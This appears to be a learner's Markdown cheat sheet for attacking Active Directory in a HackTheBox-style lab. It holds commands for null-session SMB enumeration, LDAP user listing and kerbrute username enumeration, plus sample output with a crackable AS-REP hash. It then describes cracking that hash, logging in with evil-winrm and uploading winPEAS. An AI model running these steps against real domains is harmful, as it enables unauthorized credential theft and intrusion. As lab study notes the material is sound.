# Active Directory CheatSheet

### What I want to learn from this path.

    - Understand how kerberos and Kerbrute works!



### SMB service
-   using smbmap we can get the shares
    
    ```bash
    smbmap -H <host> -u 'null'
    # to perform the null session 
    ```


-   using smbclient

    ```bash
    smbclient -L //<host>/Shares -N
    # with -N we perform a null session

    smbclient //<host>/Shares -N
    # to connect without listing the shares
    ```
    

### LAPS
Local Administrator Password Solution. Is used to manage local account
passwords of Active Directory computers.




### LDAP (Lightweight directory access protocol)
Is a protocol that makes it possible for applications to query
user information rapidly.


the port fort ldap 389


Someone within your office wants to do two things: Send email to a
recent hire and print a copy of that conversation on a new printer.
LDAP (lightweight directory access protocol) makes both of those steps possible.

Set it up properly, and that employee doesn't need to talk with IT
to complete the tasks.


### What is LDAP?

Companies store usernames, passwords, email addresses, printers
connections, and other static data within directories. LDAP is an
open, vendor-natural application protocol for accessing and main-
taining that data. LDAP can also trackle authentication, so users can sign
on just once and access many different files on the server.

```bash
# user enumeration for ldap protocol 389

/opt/windapsearch.py -d <domain> --dc-ip <ip address>


GetADUsers.py -d <domain>/ -dc-ip <ip address> -debug
```


### Kerberos


With a several names, we get using user-anarchy, possible
usernames

and perform a kerbrute attack

```bash
kerbrute userenum -d <domain> --dc <ip address> user-list.txt
```

with this tool if there are any valid user in the user-list.txt
we get a hash referring to a Ticket Granted Ticket

```bash
❯ /opt/kerbrute  userenum -d <domain name "commonly .local or .htb"> --dc <ip address domain controller> unames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 05/29/23 - Ronnie Flathers @ropnop

2023/05/29 23:33:40 >  Using KDC(s):
2023/05/29 23:33:40 >   10.10.10.175:88

2023/05/29 23:33:40 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$<userdomain>@<domain>:bfd52a00b7693df3d6c4533635983c1f$78a4e39f138d5fecdd6cb4e0f9e7f8caaf0fc096f62de5e39e7d98b4e014dd4698958370c1cc99a93cd8873bdeb0c69748b5287cf2eb5dfd1226d46e47f0355d6f28d11af7b9817cbdefb2d4181c93f97c1e965ff770d4fc249f5affb3a8d7c66dee163b964fd6cbdf86ce4cf9e48977a323b900983c039107595e102cdd94f2f58401648dafc640000bdd47ac893093acf823ed196f006782e080b0bc7837996057e49e61f10bcb68da69ac0665b6ec9c1daf416636119397caea1341b1b6ec531d5b08fe746ff04e57b59509ffdb965187ef997b44c4d01ffd96478a63785f1d8841022d3c7126b6603502721a1548123610777cf7d667ac2e94a53907ca5ffaa4792d35fd1fd4b8dcf5bd0b5c326aa7878bf24294
2023/05/29 23:33:40 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2023/05/29 23:33:41 >  Done! Tested 24 usernames (1 valid) in 0.481 seconds
```

The code above it's an example of how can i do to get the TGT from kerbrute and
after that I cracked it and i get the password for the user fsmith and
connect it with evil-winrm


Inside the Powershell console, I started enumerating information

```powershell
net user <user>

# to get the ptivilege information about that user
whoami /priv

# to find any other resurce inside the Powershell I use

Get-ChildItem -Path "C:\Users\<User>" -Filter "name of file" -Recurse
```

## Further information

Using Winpeas.exe and updload it from the attack machine by evil-winrm
and get the information using evil-winrm

### Getting information using the Winpeas.exe

## Bloodhound

...


## Services in Active Directory
